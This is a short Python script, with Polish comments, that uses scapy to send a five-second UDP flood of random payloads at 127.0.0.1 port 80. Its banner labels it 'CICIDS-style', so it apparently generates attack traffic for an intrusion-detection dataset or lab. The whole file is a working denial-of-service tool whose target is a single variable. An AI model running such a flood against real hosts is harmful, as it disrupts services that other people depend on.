#!/usr/bin/env python3

from scapy.all import *
import random
import time
import os

TARGET_IP = "127.0.0.1"
TARGET_PORT = 80

RATE = 2000   # pakietów na sekundę
SECONDS = 5

def udp_flood():
    print("[*] Starting CICIDS-style UDP flood...")

    end = time.time() + SECONDS
    while time.time() < end:
        pkt = IP(dst=TARGET_IP)/UDP(dport=TARGET_PORT, sport=65535)/Raw(
            os.urandom(random.randint(200, 1400))  # losowe payloady
        )
        send(pkt, verbose=0)
        time.sleep(1 / RATE)

    print("[✓] UDP flood complete.")


if __name__ == "__main__":
    udp_flood()
